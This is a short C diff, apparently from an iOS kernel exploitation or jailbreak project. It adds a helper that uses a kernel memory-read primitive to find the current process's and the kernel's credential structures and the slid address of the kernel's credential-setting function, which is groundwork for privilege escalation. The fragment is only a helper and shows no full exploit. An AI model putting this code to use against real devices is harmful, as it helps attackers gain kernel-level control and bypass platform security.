@@ -66,3 +66,27 @@ uint64_t vm_map_get_pmap(uint64_t vm_map) {
 uint64_t pmap_get_ttep(uint64_t pmap) {
     return kread64(pmap + off_pmap_ttep);
 }
+
+uint64_t get_ucred(uint64_t proc) {
+    uint64_t ucred = 0;
+    if(off_p_ucred == 0){
+        uint64_t self_ro = kread64(proc + 0x20);
+        printf("[DEBUG] self ro: 0x%llx\n", self_ro);
+        uint64_t self_ucred = kread64(self_ro + 0x20);
+        printf("[DEBUG] self ucred: 0x%llx\n", self_ucred); //ucred
+        uint64_t kernproc = get_kernproc();
+        printf("[DEBUG] Kernel proc: 0x%llx\n", kernproc);
+        uint64_t kern_ro = kread64(kernproc + 0x20);
+        printf("[DEBUG] Kernel ro: 0x%llx\n", kern_ro);
+        uint64_t kern_ucred = kread64(kern_ro + 0x20);
+        printf("[DEBUG] Kernel ucred: 0x%llx\n", kern_ucred); //kern_ucred
+        uint64_t proc_set_ucred = off_proc_set_ucred;
+        proc_set_ucred += get_kslide(); //proc_set_ucred
+        printf("[DEBUG] Kernel set_ucred: 0x%llx\n", proc_set_ucred); //func:
+        ucred = self_ucred;
+        
+    } else {
+        ucred = kread64(proc + off_p_ucred);
+    }
+    return ucred;
+}
